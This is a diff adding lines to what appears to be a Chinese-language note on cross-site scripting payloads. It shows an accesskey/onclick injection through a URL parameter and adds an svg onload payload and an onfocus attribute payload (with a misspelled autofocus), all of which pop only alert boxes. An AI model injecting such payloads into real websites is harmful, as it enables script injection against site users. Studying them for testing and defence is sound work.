@@ -264,3 +264,13 @@ pic=dog_cat.jpg" accesskey="x" onclick="alert(/xss/)&submit=下载
 触发快捷键即可弹出xss窗口
 
 ![](https://hummer-vin.oss-cn-beijing.aliyuncs.com/images/20220519145220.png)
+
+
+
+### svg标签
+
+```<svg onload=alert(/xss/)>```
+
+### 结点属性 
+
+onfocus=alert(1337) autofucus=""
